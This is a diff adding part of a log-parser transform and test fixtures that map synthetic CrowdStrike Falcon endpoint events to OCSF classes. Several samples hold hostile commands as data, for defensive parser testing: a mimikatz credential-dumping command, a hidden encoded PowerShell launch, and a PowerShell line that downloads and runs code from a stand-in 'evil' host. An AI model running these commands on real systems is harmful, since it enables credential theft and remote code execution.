+          if __keep && is_string(value) && match(string!(value), r'^[ \t\n\r]*[\x5B\x7B]') {
+              __decoded, __decode_err = parse_json(string!(value))
+              __keep = !(__decode_err == null && (is_object(__decoded) || is_array(__decoded)))
+          }
+          if __keep {
+              __key = snakecase(key)
+              if !includes(keys(__residual), __key) { __residual = set!(__residual, [__key], value) }
+          }
+      }
+  }
+  # Parser-declared derived evidence is merged after source spill, with recursive
+  # redaction. These entries preserve meaning beyond source scalar value equality.
+  for_each(__preserve) -> |_index, key| {
+      __derived = get!(object!(__safe.existing), [string!(key)])
+      if __derived != null { __residual = set!(__residual, [string!(key)], __derived) }
+  }
+  __discard = del(.unmapped)
+  if !is_empty(__residual) { .unmapped = __residual }
+  .
+  # END NAN-2421 residual spill
+
+samples:
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"AsepValueUpdate\", \"ContextTimeStamp\": \"1787043985.5\", \"TargetObjectPath\": \"\\\\REGISTRY\\\\MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", \"TargetObjectName\": \"Updater\", \"TargetObjectData\": \"C:\\\\ProgramData\\\\evil\\\\payload.exe\", \"AsepClass\": \"12\", \"ContextProcessId\": \"128472361926\"}"
+    expect:
+      "class_uid": 201002
+      "activity_id": 2
+      "metadata.version": "1.9.0"
+  - raw: "{\"metadata\": {\"customerIDHash\": \"ffeeddcc\", \"offset\": 42318, \"eventType\": \"AuthActivityAuditEvent\", \"eventCreationTime\": 1787044080000, \"version\": \"1.0\"}, \"event\": {\"UserId\": \"soc.analyst@corp.example\", \"UserIp\": \"198.51.100.20\", \"OperationName\": \"userAuthenticate\", \"ServiceName\": \"CrowdStrike Authentication\", \"Success\": \"true\", \"UTCTimestamp\": \"2026-08-18T12:01:20Z\"}}"
+    expect:
+      "class_uid": 3002
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "Aug 18 12:00:00 falcon-collector: dropped frame, not json at all"
+    expect:
+      "class_uid": 1007
+      "activity_id": 99
+      "metadata.version": "1.9.0"
+  - raw: "{\"metadata\": {\"customerIDHash\": \"ffeeddcc\", \"offset\": 42315, \"eventType\": \"DetectionSummaryEvent\", \"eventCreationTime\": 1787044050000, \"version\": \"1.0\"}, \"event\": {\"ProcessStartTime\": 1787044040, \"ProcessEndTime\": 0, \"ProcessId\": 128472361926, \"ParentProcessId\": 128472361100, \"ComputerName\": \"WKS-EDR-01\", \"UserName\": \"alice\", \"DetectName\": \"Credential Theft via LSASS Access\", \"DetectDescription\": \"A process accessed LSASS memory.\", \"Severity\": 4, \"SeverityName\": \"High\", \"FileName\": \"mimikatz.exe\", \"FilePath\": \"\\\\Device\\\\HarddiskVolume2\\\\temp\\\\\", \"CommandLine\": \"mimikatz.exe sekurlsa::logonpasswords\", \"SHA256String\": \"4444444444444444444444444444444444444444444444444444444444444444\", \"MD5String\": \"55555555555555555555555555555555\", \"MachineDomain\": \"CORP\", \"FalconHostLink\": \"https://falcon.crowdstrike.com/activity/detections/detail/x\", \"SensorId\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"DetectId\": \"ldt:1a2b3c:4455667788\", \"LocalIP\": \"10.20.30.40\", \"Tactic\": \"Credential Access\", \"Technique\": \"OS Credential Dumping\", \"Objective\": \"Gain Access\", \"PatternDispositionDescription\": \"Prevention, process killed.\", \"PatternDispositionValue\": 2176, \"IOCType\": \"hash_sha256\", \"IOCValue\": \"4444444444444444444444444444444444444444444444444444444444444444\", \"ParentImageFileName\": \"\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\explorer.exe\", \"ParentCommandLine\": \"explorer.exe\", \"State\": \"open\"}}"
+    expect:
+      "class_uid": 2004
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"DirectoryCreate\", \"ContextTimeStamp\": \"1787043975.5\", \"TargetDirectoryName\": \"\\\\Device\\\\HarddiskVolume2\\\\ProgramData\\\\evil\", \"ContextProcessId\": \"128472361926\"}"
+    expect:
+      "class_uid": 1001
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"DnsRequest\", \"ContextTimeStamp\": \"1787043960.5\", \"DomainName\": \"malicious.example.com\", \"RequestType\": \"1\", \"IP4Records\": \"93.184.216.34;93.184.216.35;\", \"FirstIP4Record\": \"93.184.216.34\", \"QueryStatus\": \"0\", \"DnsRequestCount\": \"1\", \"ContextProcessId\": \"128472361926\"}"
+    expect:
+      "class_uid": 4003
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"DriverLoad\", \"ContextTimeStamp\": \"1787043990.5\", \"ImageFileName\": \"\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\drivers\\\\evil.sys\", \"SHA256HashData\": \"3333333333333333333333333333333333333333333333333333333333333333\", \"SignInfoFlags\": \"8683538\", \"ContextProcessId\": \"128472361100\"}"
+    expect:
+      "class_uid": 1005
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"EndOfProcess\", \"ContextTimeStamp\": \"1787043900.1\", \"ImageFileName\": \"\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\cmd.exe\", \"RawProcessId\": \"4812\", \"TargetProcessId\": \"128472361926\", \"UserSid\": \"S-1-5-21-1004336348-1177238915-682003330-1001\"}"
+    expect:
+      "class_uid": 1007
+      "activity_id": 2
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"PeFileWritten\", \"ContextTimeStamp\": \"1787043970.5\", \"TargetFileName\": \"\\\\Device\\\\HarddiskVolume2\\\\Users\\\\alice\\\\AppData\\\\Local\\\\Temp\\\\payload.exe\", \"Size\": \"245760\", \"SHA256HashData\": \"deadbeefcafe0011223344556677889900aabbccddeeff001122334455667788\", \"MD5HashData\": \"00112233445566778899aabbccddeeff\", \"FileOperatorSid\": \"S-1-5-18\", \"IsOnNetwork\": \"0\", \"IsOnRemovableDisk\": \"0\", \"ContextProcessId\": \"128472361926\"}"
+    expect:
+      "class_uid": 1001
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"ImageHash\", \"ContextTimeStamp\": \"1787043980.5\", \"ImageFileName\": \"\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\svchost.exe\", \"SHA256HashData\": \"1111111111111111111111111111111111111111111111111111111111111111\", \"MD5HashData\": \"22222222222222222222222222222222\", \"ContextProcessId\": \"128472361100\"}"
+    expect:
+      "class_uid": 1001
+      "activity_id": 99
+      "metadata.version": "1.9.0"
+  - raw: "{\"metadata\": {\"customerIDHash\": \"ffeeddcc\", \"offset\": 42316, \"eventType\": \"IncidentSummaryEvent\", \"eventCreationTime\": 1787044060000, \"version\": \"1.0\"}, \"event\": {\"IncidentStartTime\": 1787043600, \"IncidentEndTime\": 1787044050, \"FalconHostLink\": \"https://falcon.crowdstrike.com/incidents/x\", \"FineScore\": 74, \"IncidentType\": \"Malicious Behavior\", \"State\": \"open\", \"LateralMovement\": 1, \"IncidentId\": \"inc:1a2b3c:998877\", \"ComputerName\": \"WKS-EDR-01\", \"AgentIdString\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"Severity\": 3}}"
+    expect:
+      "class_uid": 2004
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"InjectedThread\", \"ContextTimeStamp\": \"1787043910.0\", \"InjectingProcessId\": \"128472361926\", \"InjectingProcessImageFileName\": \"\\\\Device\\\\HarddiskVolume2\\\\temp\\\\loader.exe\", \"InjectedProcessId\": \"128472362000\", \"InjectedProcessImageFileName\": \"\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\lsass.exe\", \"InjectedThread\": \"1\", \"ContextProcessId\": \"128472361926\"}"
+    expect:
+      "class_uid": 1007
+      "activity_id": 4
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"InstalledApplication\", \"ContextTimeStamp\": \"1787044030.5\", \"AppName\": \"7-Zip 23.01\", \"AppVersion\": \"23.01\", \"AppVendor\": \"Igor Pavlov\", \"AppInstallPath\": \"C:\\\\Program Files\\\\7-Zip\", \"AppInstalledDate\": \"1780000000\"}"
+    expect:
+      "class_uid": 5020
+      "activity_id": 2
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"NetworkReceiveAcceptIP4\", \"ContextTimeStamp\": \"1787043950.5\", \"LocalAddressIP4\": \"10.20.30.40\", \"LocalPort\": \"3389\", \"RemoteAddressIP4\": \"198.51.100.9\", \"RemotePort\": \"61122\", \"Protocol\": \"6\", \"ConnectionDirection\": \"1\", \"ContextProcessId\": \"128472361100\"}"
+    expect:
+      "class_uid": 4001
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"NetworkCloseIP4\", \"ContextTimeStamp\": \"1787043930.5\", \"LocalAddressIP4\": \"10.20.30.40\", \"LocalPort\": \"52344\", \"RemoteAddressIP4\": \"93.184.216.34\", \"RemotePort\": \"443\", \"Protocol\": \"6\", \"ConnectionDirection\": \"0\", \"BytesSent\": \"4096\", \"BytesReceived\": \"81920\", \"ContextProcessId\": \"128472361926\"}"
+    expect:
+      "class_uid": 4001
+      "activity_id": 2
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"NetworkConnectIP4\", \"ContextTimeStamp\": \"1787043920.5\", \"LocalAddressIP4\": \"10.20.30.40\", \"LocalPort\": \"52344\", \"RemoteAddressIP4\": \"93.184.216.34\", \"RemotePort\": \"443\", \"Protocol\": \"6\", \"ConnectionDirection\": \"0\", \"ConnectionFlags\": \"0\", \"ContextProcessId\": \"128472361926\", \"InContext\": \"0\", \"EventOrigin\": \"1\"}"
+    expect:
+      "class_uid": 4001
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"NetworkListenIP4\", \"ContextTimeStamp\": \"1787043940.5\", \"LocalAddressIP4\": \"0.0.0.0\", \"LocalPort\": \"3389\", \"Protocol\": \"6\", \"ContextProcessId\": \"128472361100\"}"
+    expect:
+      "class_uid": 4001
+      "activity_id": 7
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"OsVersionInfo\", \"ContextTimeStamp\": \"1787044035.5\", \"MajorVersion\": \"10\", \"MinorVersion\": \"0\", \"BuildNumber\": \"19045\", \"ProductType\": \"1\", \"ProductName\": \"Windows 10 Pro\", \"ServicePackMajor\": \"0\"}"
+    expect:
+      "class_uid": 5001
+      "activity_id": 2
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"ProcessRollup2\", \"ContextTimeStamp\": \"1787043600.451\", \"ImageFileName\": \"\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -NoP -W Hidden -Enc SQBFAFgA\", \"RawProcessId\": \"4812\", \"TargetProcessId\": \"128472361926\", \"ParentProcessId\": \"128472361100\", \"ParentBaseFileName\": \"explorer.exe\", \"SHA256HashData\": \"9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f\", \"MD5HashData\": \"7353f60b1739074eb17c5f4dddefe239\", \"SHA1HashData\": \"0000000000000000000000000000000000000000\", \"UserSid\": \"S-1-5-21-1004336348-1177238915-682003330-1001\", \"AuthenticationId\": \"999123\", \"IntegrityLevel\": \"12288\", \"TokenType\": \"1\", \"ProcessStartTime\": \"1787043600.451\", \"ProcessGroupId\": \"128472361926\"}"
+    expect:
+      "class_uid": 1007
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"ScheduledTaskRegistered\", \"ContextTimeStamp\": \"1787044000.5\", \"TaskName\": \"\\\\Microsoft\\\\Windows\\\\EvilUpdate\", \"TaskExecCommand\": \"C:\\\\ProgramData\\\\evil\\\\payload.exe\", \"TaskExecArguments\": \"-silent\", \"TaskAuthor\": \"CORP\\\\alice\", \"UserSid\": \"S-1-5-21-1004336348-1177238915-682003330-1001\", \"ContextProcessId\": \"128472361926\"}"
+    expect:
+      "class_uid": 1006
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"ScriptControlScanInfo\", \"ContextTimeStamp\": \"1787044005.5\", \"ScriptContent\": \"IEX (New-Object Net.WebClient).DownloadString('http://evil/x')\", \"ScriptContentName\": \"stager.ps1\", \"ScriptContentSource\": \"1\", \"ContextProcessId\": \"128472361926\"}"
+    expect:
+      "class_uid": 1009
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"ServiceStarted\", \"ContextTimeStamp\": \"1787043995.5\", \"ServiceDisplayName\": \"Evil Persistence Service\", \"ServiceImagePath\": \"C:\\\\ProgramData\\\\evil\\\\payload.exe -svc\", \"ServiceType\": \"16\", \"ServiceStartType\": \"2\", \"ServiceObjectName\": \"LocalSystem\", \"ContextProcessId\": \"128472361100\"}"
+    expect:
+      "class_uid": 201004
+      "activity_id": 3
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"MotwWritten\", \"ContextTimeStamp\": \"1787044040.5\", \"TargetFileName\": \"\\\\Device\\\\HarddiskVolume2\\\\Users\\\\alice\\\\Downloads\\\\invoice.docm\", \"ContextProcessId\": \"128472361926\"}"
+    expect:
+      "class_uid": 1007
+      "activity_id": 99
+      "metadata.version": "1.9.0"
+  - raw: "{\"metadata\": {\"customerIDHash\": \"ffeeddcc\", \"offset\": 42317, \"eventType\": \"UserActivityAuditEvent\", \"eventCreationTime\": 1787044070000, \"version\": \"1.0\"}, \"event\": {\"UserId\": \"soc.analyst@corp.example\", \"UserIp\": \"198.51.100.20\", \"OperationName\": \"detection_update\", \"ServiceName\": \"detections\", \"UTCTimestamp\": \"2026-08-18T12:01:10Z\", \"AuditKeyValues\": [{\"Key\": \"detection_id\", \"ValueString\": \"ldt:1a2b3c:4455667788\"}]}}"
+    expect:
+      "class_uid": 6003
+      "activity_id": 3
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"UserLogoff\", \"ContextTimeStamp\": \"1787044020.5\", \"UserName\": \"alice\", \"UserSid\": \"S-1-5-21-1004336348-1177238915-682003330-1001\", \"LogonId\": \"0x3e7abc\", \"LogonType\": \"10\"}"
+    expect:
+      "class_uid": 3002
+      "activity_id": 2
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"UserLogonFailed\", \"ContextTimeStamp\": \"1787044015.5\", \"UserName\": \"administrator\", \"UserSid\": \"S-1-0-0\", \"LogonType\": \"3\", \"LogonDomain\": \"CORP\", \"RemoteAddressIP4\": \"198.51.100.66\", \"AuthenticationPackage\": \"NTLM\", \"Status\": \"0xC000006D\", \"SubStatus\": \"0xC000006A\"}"
+    expect:
+      "class_uid": 3002
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"UserLogon\", \"ContextTimeStamp\": \"1787044010.5\", \"UserName\": \"alice\", \"UserSid\": \"S-1-5-21-1004336348-1177238915-682003330-1001\", \"LogonType\": \"10\", \"LogonId\": \"0x3e7abc\", \"RemoteAddressIP4\": \"198.51.100.9\", \"AuthenticationPackage\": \"Kerberos\", \"LogonDomain\": \"CORP\", \"LogonServer\": \"DC-01\", \"UserIsAdmin\": \"1\", \"RemoteAccount\": \"0\"}"
+    expect:
+      "class_uid": 3002
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"WmiCreateProcess\", \"ContextTimeStamp\": \"1787044025.5\", \"ImageFileName\": \"\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": \"cmd.exe /c whoami\", \"RawProcessId\": \"6001\", \"TargetProcessId\": \"128472363000\", \"UserSid\": \"S-1-5-21-1004336348-1177238915-682003330-1001\", \"ContextProcessId\": \"128472361926\"}"
+    expect:
+      "class_uid": 1007
+      "activity_id": 1
+      "metadata.version": "1.9.0"
+  # NAN-3702 (existing sample, error branch): metadata.uid is sha256("crowdstrike_falcon|raw|" + raw), so the
+  # same record parsed twice gets the same uid (a random uid could never match).
+  - raw: "Aug 18 12:00:00 falcon-collector: dropped frame, not json at all"
+    expect:
+      "metadata.uid": "ed953339509ffaa601de5d9f469f370550bf7db47c3157b17bd7fb5c2c9680d6"
+  # NAN-3702 (natural id removed): metadata.uid is sha256("crowdstrike_falcon|raw|" + raw), so the
+  # same record parsed twice gets the same uid (a random uid could never match).
+  - raw: "{\"metadata\":{\"customerIDHash\":\"ffeeddcc\",\"offset\":42315,\"eventType\":\"DetectionSummaryEvent\",\"eventCreationTime\":1787044050000,\"version\":\"1.0\"},\"event\":{\"ProcessStartTime\":1787044040,\"ProcessEndTime\":0,\"ProcessId\":128472361926,\"ParentProcessId\":128472361100,\"ComputerName\":\"WKS-EDR-01\",\"UserName\":\"alice\",\"DetectName\":\"Credential Theft via LSASS Access\",\"DetectDescription\":\"A process accessed LSASS memory.\",\"Severity\":4,\"SeverityName\":\"High\",\"FileName\":\"mimikatz.exe\",\"FilePath\":\"\\\\Device\\\\HarddiskVolume2\\\\temp\\\\\",\"CommandLine\":\"mimikatz.exe sekurlsa::logonpasswords\",\"SHA256String\":\"4444444444444444444444444444444444444444444444444444444444444444\",\"MD5String\":\"55555555555555555555555555555555\",\"MachineDomain\":\"CORP\",\"FalconHostLink\":\"https://falcon.crowdstrike.com/activity/detections/detail/x\",\"SensorId\":\"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\",\"LocalIP\":\"10.20.30.40\",\"Tactic\":\"Credential Access\",\"Technique\":\"OS Credential Dumping\",\"Objective\":\"Gain Access\",\"PatternDispositionDescription\":\"Prevention, process killed.\",\"PatternDispositionValue\":2176,\"IOCType\":\"hash_sha256\",\"IOCValue\":\"4444444444444444444444444444444444444444444444444444444444444444\",\"ParentImageFileName\":\"\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\explorer.exe\",\"ParentCommandLine\":\"explorer.exe\",\"State\":\"open\"}}"
+    expect:
+      "metadata.uid": "3514c5567d59789dddc05b59ba996d0016278778e07612b5017e688d91d8ced2"
+      "finding_info.uid": "3514c5567d59789dddc05b59ba996d0016278778e07612b5017e688d91d8ced2"
+      "finding_info.analytic.uid": "3514c5567d59789dddc05b59ba996d0016278778e07612b5017e688d91d8ced2"
+  # NAN-3702 (natural id removed): metadata.uid is sha256("crowdstrike_falcon|raw|" + raw), so the
+  # same record parsed twice gets the same uid (a random uid could never match).
+  - raw: "{\"cid\":\"ffeeddccbbaa99887766554433221100\",\"aip\":\"203.0.113.44\",\"ComputerName\":\"WKS-EDR-01\",\"event_platform\":\"Win\",\"ConfigBuild\":\"1007.3.0016606.11\",\"timestamp\":\"1787043600000\",\"event_simpleName\":\"AsepValueUpdate\",\"ContextTimeStamp\":\"1787043985.5\",\"TargetObjectPath\":\"\\\\REGISTRY\\\\MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\"TargetObjectName\":\"Updater\",\"TargetObjectData\":\"C:\\\\ProgramData\\\\evil\\\\payload.exe\",\"AsepClass\":\"12\",\"ContextProcessId\":\"128472361926\"}"
+    expect:
+      "metadata.uid": "521ef26b8d0dc5a9ff19d47ea583a966b04759976fd7394fa54348497f164448"
+      "metadata.original_event_uid": "<missing>"
+  # NAN-3718: a detection's DetectId is its native id
+  - raw: "{\"metadata\": {\"customerIDHash\": \"ffeeddcc\", \"offset\": 42315, \"eventType\": \"DetectionSummaryEvent\", \"eventCreationTime\": 1787044050000, \"version\": \"1.0\"}, \"event\": {\"ProcessStartTime\": 1787044040, \"ProcessEndTime\": 0, \"ProcessId\": 128472361926, \"ParentProcessId\": 128472361100, \"ComputerName\": \"WKS-EDR-01\", \"UserName\": \"alice\", \"DetectName\": \"Credential Theft via LSASS Access\", \"DetectDescription\": \"A process accessed LSASS memory.\", \"Severity\": 4, \"SeverityName\": \"High\", \"FileName\": \"mimikatz.exe\", \"FilePath\": \"\\\\Device\\\\HarddiskVolume2\\\\temp\\\\\", \"CommandLine\": \"mimikatz.exe sekurlsa::logonpasswords\", \"SHA256String\": \"4444444444444444444444444444444444444444444444444444444444444444\", \"MD5String\": \"55555555555555555555555555555555\", \"MachineDomain\": \"CORP\", \"FalconHostLink\": \"https://falcon.crowdstrike.com/activity/detections/detail/x\", \"SensorId\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"DetectId\": \"ldt:1a2b3c:4455667788\", \"LocalIP\": \"10.20.30.40\", \"Tactic\": \"Credential Access\", \"Technique\": \"OS Credential Dumping\", \"Objective\": \"Gain Access\", \"PatternDispositionDescription\": \"Prevention, process killed.\", \"PatternDispositionValue\": 2176, \"IOCType\": \"hash_sha256\", \"IOCValue\": \"4444444444444444444444444444444444444444444444444444444444444444\", \"ParentImageFileName\": \"\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\explorer.exe\", \"ParentCommandLine\": \"explorer.exe\", \"State\": \"open\"}}"
+    expect:
+      "metadata.original_event_uid": "ldt:1a2b3c:4455667788"
+  # NAN-3718: an FDR record's per-event `id` UUID is its native id
